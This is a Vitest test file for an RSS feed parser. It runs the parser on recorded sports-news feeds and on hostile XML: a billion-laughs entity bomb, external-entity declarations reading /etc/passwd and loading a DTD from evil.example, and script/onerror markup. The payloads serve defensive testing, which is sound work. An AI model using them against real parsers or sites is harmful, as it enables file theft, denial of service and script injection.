// xml.test.ts — the RSS reader (src/sources/news/xml.ts) on the three committed captures and on
// hostile documents: XML entity bombs and external entities (never expanded), CDATA tricks,
// comments and processing instructions, script tags and unescaped markup inside fields, bidi and
// zero-width text, huge items, item and depth ceilings, unterminated and mismatched markup, a BOM,
// invalid UTF-8, a non-RSS root. Malformed input never throws.
import fc from "fast-check";
import { describe, expect, it } from "vitest";
import { decodeBody, decodeXmlText, parseRss, RSS_LIMITS } from "../../../src/sources/news/xml.js";
import { CAPTURED, rss } from "./helpers.js";

describe("the committed captures", () => {
  it("RotoWire: 5 items, every field, the 12-hour pubDate kept verbatim", () => {
    const d = parseRss(CAPTURED.rotowire());
    expect(d).toMatchObject({
      root: "rss",
      channel: true,
      doctype: false,
      truncated_fields: 0,
      dropped_items: 0,
    });
    expect(d.items).toHaveLength(5);
    expect(d.items[0]).toMatchObject({
      guid: "nfl641059",
      title: "Joe Mixon: Not joining Seattle after all",
      link: "https://www.rotowire.com//football/player/joe-mixon-11707",
      pubDate: "Tue, 06 Oct 2026 11:05:00 AM PDT",
    });
    expect(d.items[0]?.children).toEqual(["guid", "title", "link", "description", "pubDate"]);
    expect(d.warnings).toEqual([]);
  });

  it("ESPN: 25 items, CDATA unwrapped", () => {
    const d = parseRss(CAPTURED.espn());
    expect(d.items).toHaveLength(25);
    expect(d.items[2]).toMatchObject({
      title: "Source: Seahawks decide not to sign RB Mixon after physical",
      guid: "US-EN-50118173",
      pubDate: "Tue, 6 Oct 2026 14:03:39 EST",
    });
  });

  it("CBS: 35 items, padded whitespace kept for the source to collapse, &#039; decoded", () => {
    const d = parseRss(CAPTURED.cbs());
    expect(d.items).toHaveLength(35);
    expect(d.items[2]?.title?.trim()).toBe(
      "Michael Penix Jr. has completely revived the Falcons' offense. Can it continue after a hot start?",
    );
    expect(d.items[0]?.guid).toBe("b041ae17-0ce6-4366-baad-3cb6d2a03e55");
    expect(d.items[0]?.link).toMatch(/^\s+https:\/\/www\.cbssports\.com\/nfl\/news\//);
  });
});

describe("entities", () => {
  it("decodes the five XML entities and numeric references in one pass", () => {
    expect(decodeXmlText("a &lt;b&gt; &amp; &quot;c&quot; &apos;d&apos; &#65;&#x42;")).toBe(
      `a <b> & "c" 'd' AB`,
    );
    expect(decodeXmlText("&amp;lt;script&amp;gt;")).toBe("&lt;script&gt;");
    expect(decodeXmlText("&nbsp;&copy;&lol;")).toBe("&nbsp;&copy;&lol;");
    expect(decodeXmlText("&#0;&#xD800;&#x110000;&#1;&#9;")).toBe("\t");
    expect(decodeXmlText("no entities")).toBe("no entities");
  });

  it("never expands a declared entity (billion laughs stays literal, bounded)", () => {
    const lol = Array.from({ length: 9 }, (_, i) =>
      i === 0
        ? `<!ENTITY lol0 "lol">`
        : `<!ENTITY lol${String(i)} "${`&lol${String(i - 1)};`.repeat(10)}">`,
    ).join("");
    const xml = rss([{ title: "&lol8; Player A: Ruled out" }], {
      raw: true,
      head: `<!DOCTYPE rss [${lol}]>`,
    });
    const t0 = performance.now();
    const d = parseRss(xml);
    expect(performance.now() - t0).toBeLessThan(1_000);
    expect(d.doctype).toBe(true);
    expect(d.items[0]?.title).toBe("&lol8; Player A: Ruled out");
    expect(d.warnings.some((w) => w.includes("DOCTYPE"))).toBe(true);
  });

  it("never resolves an external entity or a parameter entity", () => {
    const xml = rss([{ title: "&xxe; &file;" }], {
      raw: true,
      head: `<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY % p SYSTEM "https://evil.example/x.dtd"> %p; <!ENTITY file SYSTEM "https://evil.example/">]>`,
    });
    const d = parseRss(xml);
    expect(d.items[0]?.title).toBe("&xxe; &file;");
    expect(d.root).toBe("rss");
  });
});

describe("hostile fields", () => {
  it("keeps markup inside a field as text (escaped or not) — the sanitiser strips it at output", () => {
    const d = parseRss(
      rss(
        [
          {
            title: "<script>alert(1)</script>Player A",
            description: "<p>one</p><img src=x onerror=y>",
          },
          { title: "&lt;b&gt;bold&lt;/b&gt;", description: "<![CDATA[<script>x</script>]]>" },
        ],
        { raw: true },
      ),
    );
    expect(d.items[0]?.title).toBe("alert(1)Player A");
    expect(d.items[0]?.description).toBe("one");
    expect(d.items[1]?.title).toBe("<b>bold</b>");
    expect(d.items[1]?.description).toBe("<script>x</script>");
  });

  it("CDATA cannot close the field early; a comment or PI inside a field is dropped", () => {
    const d = parseRss(
      rss(
        [
          {
            title: "<![CDATA[A ]]]]><![CDATA[> B]]>",
            description: "x<!-- </description><title>forged</title> -->y<?pi </description> ?>z",
          },
        ],
        { raw: true },
      ),
    );
    expect(d.items[0]?.title).toBe("A ]]> B");
    expect(d.items[0]?.description).toBe("xyz");
    expect(d.items).toHaveLength(1);
  });

  it("keeps bidi and zero-width characters as data (removed by the sanitiser, not here)", () => {
    const d = parseRss(rss([{ title: "Player​ A ‮ruled out‬" }]));
    expect(d.items[0]?.title).toBe("Player​ A ‮ruled out‬");
  });

  it("a bare '<' in text is text, and does not swallow the closing tag", () => {
    const d = parseRss(rss([{ title: "AT&T < Verizon", description: "3 < 4 > 2" }], { raw: true }));
    expect(d.items[0]?.title).toBe("AT&T < Verizon");
    expect(d.items[0]?.description).toBe("3 < 4 > 2");
    expect(d.items[0]?.guid).toBe("g0");
  });

  it("cuts a huge field at the field ceiling and counts it", () => {
    const d = parseRss(
      rss([{ title: "T".repeat(RSS_LIMITS.maxFieldChars * 3), description: "d" }]),
    );
    expect(d.items[0]?.title).toHaveLength(RSS_LIMITS.maxFieldChars);
    expect(d.items[0]?.description).toBe("d");
    expect(d.truncated_fields).toBe(1);
    expect(d.warnings.some((w) => w.includes("field ceiling"))).toBe(true);
  });

  it("reads at most maxItems items and stops at the depth ceiling", () => {
    const many = parseRss(rss(Array.from({ length: 30 }, () => ({}))), {
      ...RSS_LIMITS,
      maxItems: 10,
    });
    expect(many.items).toHaveLength(10);
    expect(many.dropped_items).toBe(20);
    const deep = parseRss(
      `<rss><channel><item><title>${"<b>".repeat(100)}x</title></item></channel></rss>`,
    );
    expect(deep.warnings.some((w) => w.includes("depth"))).toBe(true);
  });

  it("recovers from mismatched and unclosed markup", () => {
    const d = parseRss(
      `<rss><channel><item><title>A<br></title><guid>1</guid></item><item><title>B</title></channel></rss>`,
    );
    expect(d.items.map((i) => i.title)).toEqual(["A", "B"]);
    expect(d.items[0]?.guid).toBe("1");
    expect(parseRss("<rss><channel><item><title>x</").warnings).toContain(
      "an unterminated tag ends the document",
    );
    expect(parseRss("<rss><channel><item><title>open").items).toEqual([
      {
        title: "open",
        link: null,
        description: null,
        guid: null,
        pubDate: null,
        children: ["title"],
      },
    ]);
  });

  it("reads nothing after the root and nothing outside rss > channel > item", () => {
    const d = parseRss(
      `<rss><item><title>stray</title></item><channel><item><title>ok</title></item></channel></rss><rss><channel><item><title>second</title></item></channel></rss>`,
    );
    expect(d.items.map((i) => i.title)).toEqual(["ok"]);
    expect(d.warnings).toContain("content after the root element is ignored");
    const atom = parseRss(`<feed><entry><title>x</title></entry></feed>`);
    expect(atom).toMatchObject({ root: "feed", channel: false, items: [] });
    expect(parseRss("")).toMatchObject({ root: null, channel: false, items: [] });
    expect(parseRss("just text")).toMatchObject({ root: null, items: [] });
  });

  it("records only the first occurrence of a field; self-closing children are listed", () => {
    const d = parseRss(
      `<rss><channel><item><title>first</title><title>second</title><enclosure url="x"/><title/></item></channel></rss>`,
    );
    expect(d.items[0]?.title).toBe("first");
    expect(d.items[0]?.children).toEqual(["title", "enclosure"]);
  });

  it("never throws, whatever the input (property)", () => {
    fc.assert(
      fc.property(
        fc.oneof(
          fc.string({ maxLength: 500, unit: "binary" }),
          fc
            .array(
              fc.constantFrom(
                "<rss>",
                "<channel>",
                "<item>",
                "</item>",
                "<title>",
                "</title>",
                "<![CDATA[",
                "]]>",
                "<!--",
                "-->",
                "<!DOCTYPE x [",
                "]>",
                "&amp;",
                "<",
                ">",
                "x",
                '"',
                "'",
              ),
              { maxLength: 60 },
            )
            .map((a) => a.join("")),
        ),
        (s) => {
          const d = parseRss(s);
          expect(d.items.length).toBeLessThanOrEqual(RSS_LIMITS.maxItems);
        },
      ),
      { numRuns: 500 },
    );
  });
});

describe("decodeBody", () => {
  it("drops a BOM, keeps valid UTF-8, replaces invalid bytes and says so", () => {
    expect(decodeBody(new Uint8Array([0xef, 0xbb, 0xbf, 0x3c, 0x72]))).toEqual({
      text: "<r",
      lossy: false,
    });
    const bad = decodeBody(new Uint8Array([0x3c, 0xff, 0xfe, 0x72]));
    expect(bad.lossy).toBe(true);
    expect(bad.text).toBe("<��r");
  });
});
